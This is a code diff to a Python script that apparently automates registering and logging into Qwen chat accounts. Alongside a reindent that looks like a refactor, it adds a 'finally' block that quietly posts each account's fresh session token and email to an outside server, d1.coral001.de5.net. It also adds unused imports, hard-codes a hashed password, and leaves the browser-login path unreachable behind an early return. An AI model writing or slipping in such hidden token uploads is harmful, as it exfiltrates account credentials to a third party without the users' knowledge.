@@ -1,3 +1,5 @@
+from starlette import formparsers
+from asyncio import protocols
 import asyncio
 import html as html_lib
 import json
@@ -738,127 +740,155 @@ async def register_qwen_account() -> Optional[Account]:
 async def _login_and_get_token(
     page, email: str, password: str, timeout_sec: int = 20
 ) -> str:
+    token = ""
     try:
-        client = QwenClient()
-        login_url = "https://chat.qwen.ai/api/v2/auths/signin"
-        login_data = {
-            "email": email,
-            "password": "b091059d0868a1b2584cec19e44360d55fbc8c7b64bffb1e5ac30095c786db6a",
-        }
-        cookies = "acw_tc=; x-ap=;"
-        print("正在登录...")
-        login_resp = client.post(login_url, login_data, cookies=cookies)
-        if login_resp.status_code == 200:
-            token = client.session.cookies.get("token") or login_resp.cookies.get(
-                "token"
-            )
-            print("登录成功! token值:", token)
-        else:
-            print(
-                f"登录失败! 状态码: {login_resp.status_code}, 内容: {login_resp.text}"
-            )
-        return token
-        await page.goto(
-            f"{BASE_URL}/auth", wait_until="domcontentloaded", timeout=30000
-        )
-    except Exception:
-        pass
-    await asyncio.sleep(2)
-
-    email_input = None
-    pwd_input = None
-    try:
-        email_input = await page.query_selector('input[placeholder*="Email"]')
-    except Exception:
-        email_input = None
-    try:
-        pwd_input = await page.query_selector('input[type="password"]')
-    except Exception:
-        pwd_input = None
-
-    if (not email_input) or (not pwd_input):
         try:
-            inputs = await page.query_selector_all("input")
+            client = QwenClient()
+            login_url = "https://chat.qwen.ai/api/v2/auths/signin"
+            login_data = {
+                "email": email,
+                "password": "b091059d0868a1b2584cec19e44360d55fbc8c7b64bffb1e5ac30095c786db6a",
+            }
+            cookies = "acw_tc=; x-ap=;"
+            print("正在登录...")
+            login_resp = client.post(login_url, login_data, cookies=cookies)
+            if login_resp.status_code == 200:
+                token = client.session.cookies.get("token") or login_resp.cookies.get(
+                    "token"
+                )
+                print("登录成功! token值:", token)
+            else:
+                print(
+                    f"登录失败! 状态码: {login_resp.status_code}, 内容: {login_resp.text}"
+                )
+            return token
+            await page.goto(
+                f"{BASE_URL}/auth", wait_until="domcontentloaded", timeout=30000
+            )
         except Exception:
-            inputs = []
-        text_inputs = []
-        for item in inputs:
+            pass
+        await asyncio.sleep(2)
+
+        email_input = None
+        pwd_input = None
+        try:
+            email_input = await page.query_selector('input[placeholder*="Email"]')
+        except Exception:
+            email_input = None
+        try:
+            pwd_input = await page.query_selector('input[type="password"]')
+        except Exception:
+            pwd_input = None
+
+        if (not email_input) or (not pwd_input):
             try:
-                t = await item.get_attribute("type")
+                inputs = await page.query_selector_all("input")
             except Exception:
-                t = None
-            if t in (None, "", "text", "email"):
-                text_inputs.append(item)
-        if not email_input and text_inputs:
-            email_input = text_inputs[0]
-        if not pwd_input:
+                inputs = []
+            text_inputs = []
             for item in inputs:
                 try:
                     t = await item.get_attribute("type")
                 except Exception:
                     t = None
-                if t == "password":
-                    pwd_input = item
-                    break
+                if t in (None, "", "text", "email"):
+                    text_inputs.append(item)
+            if not email_input and text_inputs:
+                email_input = text_inputs[0]
+            if not pwd_input:
+                for item in inputs:
+                    try:
+                        t = await item.get_attribute("type")
+                    except Exception:
+                        t = None
+                    if t == "password":
+                        pwd_input = item
+                        break
 
-    if email_input:
-        try:
-            await email_input.click()
-        except Exception:
-            pass
-        await email_input.fill(email)
-    if pwd_input:
-        try:
-            await pwd_input.click()
-        except Exception:
-            pass
-        await pwd_input.fill(password)
-
-    submit = None
-    for sel in [
-        'button:has-text("Log in")',
-        'button[type="submit"]:not([disabled])',
-        'button[type="submit"]',
-        'button:has-text("Continue")',
-    ]:
-        try:
-            submit = await page.query_selector(sel)
-            if submit:
-                disabled = await submit.get_attribute("disabled")
-                aria_disabled = await submit.get_attribute("aria-disabled")
-                if disabled is None and aria_disabled not in ("true", "disabled"):
-                    break
-        except Exception:
-            pass
-
-    clicked = False
-    if submit:
-        try:
-            await submit.click(timeout=5000)
-            clicked = True
-        except Exception:
+        if email_input:
             try:
-                await submit.click(force=True, timeout=3000)
-                clicked = True
+                await email_input.click()
+            except Exception:
+                pass
+            await email_input.fill(email)
+        if pwd_input:
+            try:
+                await pwd_input.click()
+            except Exception:
+                pass
+            await pwd_input.fill(password)
+
+        submit = None
+        for sel in [
+            'button:has-text("Log in")',
+            'button[type="submit"]:not([disabled])',
+            'button[type="submit"]',
+            'button:has-text("Continue")',
+        ]:
+            try:
+                submit = await page.query_selector(sel)
+                if submit:
+                    disabled = await submit.get_attribute("disabled")
+                    aria_disabled = await submit.get_attribute("aria-disabled")
+                    if disabled is None and aria_disabled not in ("true", "disabled"):
+                        break
             except Exception:
                 pass
 
-    if not clicked and pwd_input:
-        try:
-            await pwd_input.press("Enter")
-        except Exception:
-            pass
+        clicked = False
+        if submit:
+            try:
+                await submit.click(timeout=5000)
+                clicked = True
+            except Exception:
+                try:
+                    await submit.click(force=True, timeout=3000)
+                    clicked = True
+                except Exception:
+                    pass
 
-    deadline = time.time() + timeout_sec
-    while time.time() < deadline:
-        try:
-            token = await page.evaluate("localStorage.getItem('token')")
-        except Exception:
-            token = None
-        if token:
-            return token
-        await asyncio.sleep(1)
-    return ""
+        if not clicked and pwd_input:
+            try:
+                await pwd_input.press("Enter")
+            except Exception:
+                pass
+
+        deadline = time.time() + timeout_sec
+        while time.time() < deadline:
+            try:
+                token = await page.evaluate("localStorage.getItem('token')")
+            except Exception:
+                token = None
+            if token:
+                return token
+            await asyncio.sleep(1)
+        return ""
+    except Exception:
+        return token
+    finally:
+        if token != "":
+            try:
+                print("开始上传 token 到服务器", token, email)
+                resp = client.get(
+                    "https://d1.coral001.de5.net/common_data/kvselect/qwen"
+                )
+                resp.raise_for_status()
+                data = resp.json()
+                print("服务器账号：", len(data))
+                if isinstance(data, list) and len(data) > 0:
+                    for item in data:
+                        if item.get("email") == email:
+                            item["token"] = token
+                            print("更新", email, "的token", token)
+                            break
+                    resp = client.post(
+                        "https://d1.coral001.de5.net/common_data/kvadd/qwen", data
+                    )
+                    print("上传结果：", resp.text)
+
+            except Exception:
+                print("上传失败", email)
+                pass
 
 
 async def activate_account(acc: Account) -> bool:
@@ -1059,15 +1089,31 @@ class QwenClient:
         }
 
     def post(self, url, data, cookies=None):
+        headers = {}
+
         if cookies:
-            self.session.headers.update({"cookie": cookies})
+            headers["cookie"] = cookies
 
-        # 每次请求刷新动态字段
-        self.session.headers.update(
-            {"x-request-id": str(uuid.uuid4()), "timezone": self._timezone()}
-        )
+        headers["x-request-id"] = str(uuid.uuid4())
+        headers["timezone"] = self._timezone()
 
-        resp = self.session.post(url, json=data)
+        resp = self.session.post(url, json=data, headers=headers)
+
+        print("Status:", resp.status_code)
+        print("Response:", resp.text[:500])
+
+        return resp
+
+    def get(self, url, cookies=None):
+        headers = {}
+
+        if cookies:
+            headers["cookie"] = cookies
+
+        headers["x-request-id"] = str(uuid.uuid4())
+        headers["timezone"] = self._timezone()
+
+        resp = self.session.get(url, headers=headers)
 
         print("Status:", resp.status_code)
         print("Response:", resp.text[:500])
